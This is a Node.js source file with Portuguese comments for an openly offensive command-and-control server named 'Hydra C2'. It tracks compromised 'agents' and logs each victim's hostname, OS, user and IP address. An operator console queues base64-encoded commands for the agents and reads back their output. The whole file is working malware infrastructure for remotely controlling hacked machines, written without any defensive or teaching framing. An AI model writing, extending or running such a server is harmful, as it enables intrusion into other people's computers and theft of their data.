// server.js - Hydra C2 - Comando Central do NK
// Versão: 3.0 - Bio-Digital (Corrigido para Chalk)
// Criado por: NK (Neural Killer) - nk3

const express = require('express');
const bodyParser = require('body-parser');
const readline = require('readline');
const base64 = require('base-64');
const chalkModule = require('chalk'); // Importa o módulo chalk
const chalk = chalkModule.default || chalkModule; // Garante que estamos usando a instância correta de chalk

const app = express();
const PORT = 8080;

// --- Banco de Dados de Agentes (em memória, pra ser rápido e sujo) ---
const agents = {}; // { agent_id: { info: {}, last_checkin: timestamp, pending_commands: [], results: [] } }

app.use(bodyParser.json());

// --- Rotas do C2 ---

// Rota de Check-in do Agente
app.post('/checkin', (req, res) => {
    const { agent_id, hostname, os, os_release, architecture, user, ip_address } = req.body;

    if (!agent_id) {
        return res.status(400).json({ status: 'error', message: 'Agent ID é obrigatório.' });
    }

    if (!agents[agent_id]) {
        agents[agent_id] = {
            info: { agent_id, hostname, os, os_release, architecture, user, ip_address },
            last_checkin: Date.now(),
            pending_commands: [],
            results: []
        };
        console.log(chalk.green(`[+] NOVO AGENTE ONLINE: ${agent_id} (${hostname} - ${ip_address})`));
    } else {
        agents[agent_id].last_checkin = Date.now();
        // Atualiza info se necessário
        agents[agent_id].info = { ...agents[agent_id].info, hostname, os, os_release, architecture, user, ip_address };
        // console.log(chalk.blue(`[*] Agente ${agent_id} fez check-in.`));
    }

    res.json({ status: 'success', message: 'Check-in recebido.' });
});

// Rota para Agente pedir comandos
app.post('/get_command', (req, res) => {
    const { agent_id } = req.body;

    if (!agent_id || !agents[agent_id]) {
        return res.status(404).json({ status: 'error', message: 'Agente não encontrado ou ID inválido.' });
    }

    agents[agent_id].last_checkin = Date.now(); // Atualiza check-in também aqui

    if (agents[agent_id].pending_commands.length > 0) {
        const command = agents[agent_id].pending_commands.shift(); // Pega o primeiro comando da fila
        console.log(chalk.yellow(`[<] Enviando comando para ${agent_id}: ${base64.decode(command)}`));
        return res.json({ status: 'success', command: command });
    }

    res.json({ status: 'success', message: 'Sem comandos pendentes.' });
});

// Rota para Agente postar resultados de comandos
app.post('/post_result', (req, res) => {
    const { agent_id, command, output } = req.body;

    if (!agent_id || !agents[agent_id]) {
        return res.status(404).json({ status: 'error', message: 'Agente não encontrado ou ID inválido.' });
    }

    agents[agent_id].last_checkin = Date.now(); // Atualiza check-in
    const decoded_output = base64.decode(output);
    agents[agent_id].results.push({ timestamp: Date.now(), command: base64.decode(command), output: decoded_output });
    console.log(chalk.magenta(`[>] Resultado de ${agent_id} para "${base64.decode(command)}":\n${decoded_output.trim()}`));

    res.json({ status: 'success', message: 'Resultado recebido.' });
});

// --- Interface de Linha de Comando (CLI) do C2 ---
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: chalk.blue('HYDRA> ')
});

// Intervalo de check-in do agente (em segundos) - precisa ser o mesmo do predator_v6.py
const CHECKIN_INTERVAL = 10;

function listAgents() {
    console.log(chalk.cyan("\n--- AGENTES ATIVOS ---"));
    let activeCount = 0;
    for (const id in agents) {
        const agent = agents[id];
        const lastSeen = (Date.now() - agent.last_checkin) / 1000; // em segundos
        if (lastSeen < (CHECKIN_INTERVAL * 3)) { // Considera ativo se checou nos últimos 3 intervalos
            activeCount++;
            console.log(chalk.white(`  ID: ${agent.info.agent_id}`));
            console.log(chalk.white(`    Hostname: ${agent.info.hostname}`));
            console.log(chalk.white(`    IP: ${agent.info.ip_address}`));
            console.log(chalk.white(`    OS: ${agent.info.os} ${agent.info.os_release}`));
            console.log(chalk.white(`    Usuário: ${agent.info.user}`));
            console.log(chalk.white(`    Último Check-in: ${lastSeen.toFixed(1)}s atrás`));
            console.log(chalk.gray("    --------------------"));
        }
    }
    if (activeCount === 0) {
        console.log(chalk.red("  Nenhum agente ativo no momento."));
    }
    console.log(chalk.cyan("----------------------\n"));
}

function sendCommandToAgent(agentId, command) {
    if (!agents[agentId]) {
        console.log(chalk.red(`[-] Agente ${agentId} não encontrado.`));
        return;
    }
    const encodedCommand = base64.encode(command);
    agents[agentId].pending_commands.push(encodedCommand);
    console.log(chalk.green(`[+] Comando "${command}" enfileirado para ${agentId}.`));
}

function viewAgentResults(agentId) {
    if (!agents[agentId]) {
        console.log(chalk.red(`[-] Agente ${agentId} não encontrado.`));
        return;
    }
    console.log(chalk.cyan(`\n--- RESULTADOS PARA AGENTE: ${agentId} ---`));
    if (agents[agentId].results.length === 0) {
        console.log(chalk.yellow("  Nenhum resultado ainda."));
    } else {
        agents[agentId].results.forEach(res => {
            console.log(chalk.white(`  [${new Date(res.timestamp).toLocaleTimeString()}] Comando: ${res.command}`));
            console.log(chalk.gray(`  Saída:\n${res.output.trim()}`));
            console.log(chalk.gray("  --------------------"));
        });
    }
    console.log(chalk.cyan("-----------------------------------\n"));
}

rl.on('line', async (line) => {
    const parts = line.trim().split(' ');
    const cmd = parts[0];

    switch (cmd) {
        case 'agents':
            listAgents();
            break;
        case 'send':
            if (parts.length < 3) {
                console.log(chalk.red('Uso: send <agent_id> <comando>'));
            } else {
                const agentId = parts[1];
                const command = parts.slice(2).join(' ');
                sendCommandToAgent(agentId, command);
            }
            break;
        case 'results':
            if (parts.length < 2) {
                console.log(chalk.red('Uso: results <agent_id>'));
            } else {
                const agentId = parts[1];
                viewAgentResults(agentId);
            }
            break;
        case 'help':
            console.log(chalk.white(`\nComandos do Hydra C2:`));
            console.log(chalk.white(`  agents         - Lista todos os agentes ativos.`));
            console.log(chalk.white(`  send <id> <cmd> - Envia um comando para um agente específico.`));
            console.log(chalk.white(`  results <id>   - Mostra os resultados dos comandos de um agente.`));
            console.log(chalk.white(`  exit           - Sai do C2.`));
            console.log(chalk.white(`  help           - Mostra esta ajuda.`));
            break;
        case 'exit':
            console.log(chalk.red('Saindo do Hydra C2. Fui!'));
            process.exit(0);
        default:
            console.log(chalk.red(`Comando desconhecido: ${cmd}. Digite 'help' para ver os comandos.`));
            break;
    }
    rl.prompt();
}).on('close', () => {
    console.log(chalk.red('Saindo do Hydra C2. Fui!'));
    process.exit(0);
});

// Inicia o servidor Express
app.listen(PORT, () => {
    console.log(chalk.bold.red(`\n🔥 HYDRA C2 ONLINE na porta ${PORT}. Aguardando os Predators...`));
    console.log(chalk.bold.red(`Digite 'help' para ver os comandos.`));
    rl.prompt();
});